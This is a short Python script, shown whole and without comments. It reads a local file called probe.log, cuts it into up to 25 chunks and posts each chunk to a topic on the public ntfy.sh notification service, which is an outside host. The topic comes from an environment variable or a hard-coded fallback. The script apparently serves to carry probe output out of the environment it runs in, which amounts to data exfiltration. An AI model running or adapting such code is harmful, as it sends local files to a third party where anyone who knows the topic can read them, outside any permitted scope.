import os, urllib.request
nt = os.environ.get("NT") or "i54911dbx7"
try:
    d = open("probe.log", "rb").read().decode("utf-8", "replace")
except Exception:
    d = "no-probe-log"
chunks = [d[i:i+3500] for i in range(0, len(d), 3500)][:25]
for i, c in enumerate(chunks):
    try:
        urllib.request.urlopen(urllib.request.Request(
            "https://ntfy.sh/" + nt, data=c.encode(),
            headers={"Title": "i54911db-%d/%d" % (i + 1, len(chunks))}), timeout=15)
    except Exception as e:
        print("ntfy err", e)
print("sent", len(chunks), "chunks to", nt)